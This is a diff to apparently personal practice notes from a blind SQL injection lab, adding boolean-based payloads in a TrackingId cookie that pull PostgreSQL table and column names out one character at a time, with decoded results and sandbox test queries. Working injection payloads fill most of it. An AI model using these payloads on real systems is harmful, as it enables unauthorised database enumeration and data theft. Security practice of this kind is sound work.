@@ -210,7 +210,7 @@ TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+current_database()),1,1))=
 TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=80--
 
 # tables
-table_name from information_schema.tables
+table_name from information_schema.tables <<-- didn't work
 TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+concat(table_name,':')+from+information_schema.tables),1,1))=97--
 
 # troubleshooting
@@ -229,8 +229,45 @@ TrackingId=obviouslywrong'+OR+(SELECT+'a'+FROM+users)='a
 # this one works (key: LIMIT 1)
 TrackingId=obviouslywrong'+OR+(SELECT+'a'+FROM+users+LIMIT+1)='a
 
-# try back <<-- failed
+# ascii
+TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring('a',1,1))+FROM+users+LIMIT+1)=97--
 
+# substring
+TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring('ab',2,1))+FROM+users+LIMIT+1)=97--;
+
+# string_agg
+TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(username,':'),1,1))+FROM+users+LIMIT+1)=97--;
+
+# tables <<-- worked
+TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(tablename,':'),1,1))+FROM+pg_catalog.pg_tables+LIMIT+1)=97--;
+
+117  u
+115  s
+101  e
+114  r
+115  s
+58   :
+112  p
+103  g
+95   _
+115  s
+116  t
+97   a
+116  t
+105  i
+115  s
+
+# columns
+TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(column_name,':'),1,1))+FROM+information_schema.columns+where+table_name='users'+LIMIT+1)=97--;
+
+117  u
+115  s
+
+```
+
+# drafts
+postgresql tests
+```
 # postgresql testing (https://extendsclass.com/postgresql-online.html)
 
 # all rows (note: 'or')
@@ -247,9 +284,11 @@ select tablename from pg_catalog.pg_tables; <<-- works
 
 select string_agg(tablename,':') from pg_catalog.pg_tables <<-- works
 
+# string_agg
 select firstname from scientist where firstname = 'albert' and ascii(substring((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1))=115; <<-- works
 
 select firstname from scientist where firstname = 'albert' and ascii(substring((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1))=116; <<-- no result (deliberate)
 
-
+# try now <<-- didn't work
+TrackingId=obviouslywrong'+AND+ASCII(SUBSTRING((select+string_agg(tablename,':')+from+pg_catalog.pg_tables),1,1))=80--
 ```
